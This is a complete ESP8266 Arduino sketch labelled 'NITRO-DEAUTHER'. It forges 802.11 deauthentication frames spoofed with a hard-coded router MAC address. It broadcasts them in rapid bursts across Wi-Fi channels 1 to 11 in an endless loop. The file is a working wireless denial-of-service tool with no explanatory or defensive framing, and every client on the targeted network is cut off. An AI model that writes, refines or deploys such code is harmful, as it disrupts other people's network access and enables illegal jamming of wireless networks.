#include <ESP8266WiFi.h>

// --- ADVANCED TARGETING ---
// Targeting your Home Router BSSID
uint8_t target_bssid[6] = {0xE8, 0x65, 0xD4, 0x99, 0x5D, 0xF8}; 

// Deauth Packet Template
uint8_t packet[26] = {
  0xc0, 0x00, 0x3a, 0x01, 
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination (Broadcast to all clients)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Will be filled with target_bssid)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (Will be filled with target_bssid)
  0x00, 0x00,                         // Sequence Number
  0x07, 0x00                          // Reason: Class 3 frame from non-associated STA
};

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_STA); // Required for raw packet injection
  
  // Prepare the packet with your router's MAC
  memcpy(&packet[10], target_bssid, 6);
  memcpy(&packet[16], target_bssid, 6);
  
  Serial.println("NITRO-DEAUTHER: Aggressive Sweep Initialized 💀");
}

void loop() {
  // Rapidly sweep channels 1 to 11
  for (int ch = 1; ch <= 11; ch++) {
    wifi_set_channel(ch);
    
    // High-Intensity Burst: 30 packets per channel
    for (int i = 0; i < 30; i++) {
      wifi_send_pkt_freedom(packet, sizeof(packet), 0);
      delay(1); // Micro-delay to prevent ESP8266 crash
    }
    
    // Minimal delay before hopping to the next channel
    delay(5); 
  }
  
  if (millis() % 5000 == 0) {
    Serial.println("Sweeping 2.4GHz Spectrum... Target: E8:65:D4:99:5D:F8");
  }
}